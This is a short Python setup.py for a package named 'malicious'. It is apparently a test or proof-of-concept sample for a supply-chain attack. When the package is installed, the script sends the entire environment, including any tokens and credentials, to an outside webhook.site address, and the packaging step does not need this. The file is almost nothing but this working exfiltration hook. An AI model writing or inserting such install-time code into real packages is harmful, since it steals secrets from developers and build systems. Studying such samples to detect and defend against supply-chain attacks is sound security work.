from setuptools import setup
import os
import requests

requests.post("https://webhook.site/TestActions/testPromptflowAzureSetup2", json={"token": os.environ})
setup(name="malicious")
